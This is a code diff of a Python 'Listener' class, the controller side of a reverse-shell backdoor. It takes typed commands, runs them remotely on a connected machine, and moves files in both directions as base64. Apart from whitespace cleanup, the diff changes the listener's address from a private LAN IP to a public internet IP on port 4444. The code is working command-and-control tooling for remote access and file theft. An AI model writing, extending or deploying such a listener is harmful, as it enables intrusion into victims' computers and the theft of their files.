@@ -1,6 +1,6 @@
 import socket, json
 import termcolor
-import base64 
+import base64
 
 
 class Listener:
@@ -44,20 +44,20 @@ class Listener:
 		file = open(path, "rb").read()
 		file = base64.encodebytes(file).decode('utf-8')
 		return file
-	
+
 	def run(self):
 		while True:
 			command = input(termcolor.colored("user $ ", "cyan"))
 			# command = input("user $ ")
-			
+
 			try:
 				if command.split()[0] == 'upload':
 					file_name = command.replace("upload ", "")
 					file_content = self.read_file(file_name)
 					command += " " + file_content
-				
+
 				result = self.execute_remotely(command)
-				
+
 				if command.split()[0] == "download":
 					file_name = command.replace("download ", "")
 					self.write_file(file_name, result)
@@ -75,5 +75,5 @@ class Listener:
 				# print("[-] Something was wrong!")
 
 
-my_listener = Listener("192.168.0.101", 4444)
+my_listener = Listener("185.247.119.121", 4444)
 my_listener.run()
